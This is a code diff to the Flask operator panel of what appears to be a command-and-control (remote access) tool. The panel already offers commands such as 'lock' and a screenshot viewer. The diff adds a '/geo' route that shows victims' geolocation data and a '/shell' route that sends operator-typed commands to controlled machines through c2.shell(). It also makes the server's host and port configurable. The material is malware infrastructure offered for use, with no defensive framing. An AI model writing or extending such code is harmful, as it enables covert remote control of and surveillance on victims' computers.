@@ -3,6 +3,7 @@ import tempfile
 import os
 import base64
 from core.c2 import CommandAndControl
+from core.misc import Misc
 from core.auth import Auth
 from core.portal import App
 from flask import  render_template, request, url_for, redirect
@@ -12,7 +13,8 @@ from waitress import serve
 app = App()
 app.debug = False
 app_instance = app.create_app()
-
+c2 = CommandAndControl()
+helper = Misc()
 
 @app_instance.route('/', methods=['GET'])
 def index():
@@ -45,7 +47,6 @@ def consolee():
     if not app_auth.isAuthenticated:
         return redirect(url_for('index'))
     else:
-        c2 = CommandAndControl()
         if request.method == 'POST':
             command = request.form['command']
             if command =='lock':
@@ -72,6 +73,12 @@ def consolee():
                     return render_template('result.html', error=error,message=error)
             elif command == 'showss':
                 return redirect(url_for('showss'))
+            
+            elif command == 'geo-stuff':
+                return redirect(url_for('geo'))
+            
+            elif command == 'shell':
+                return redirect(url_for('shell'))        
         return render_template('console.html', error=error,message=message)
 
 
@@ -97,7 +104,23 @@ def showss():
     return render_template('showss.html',ss=ss)
 
 
+@app_instance.route('/geo', methods=['GET', 'POST'])
+def geo():   
+    geo = c2.get_geo_suff()
+    return render_template('geostuff.html', geo=geo)
+
+
+@app_instance.route('/shell', methods=['GET', 'POST'])
+def shell():
+    if request.method == 'POST':
+        cmd = request.form['cmd']
+        cmd = c2.shell(cmd)
+        return render_template('webshell.html', cmd=cmd)
+    else:
+        cmd = ()
+        return render_template('webshell.html', cmd=cmd)
+
 
 if __name__ == '__main__':
     #app.run()
-    serve(app=app_instance, host='0.0.0.0',port=1337)
+    serve(app=app_instance, host=helper.config_parser('host'),port=helper.config_parser('port'))
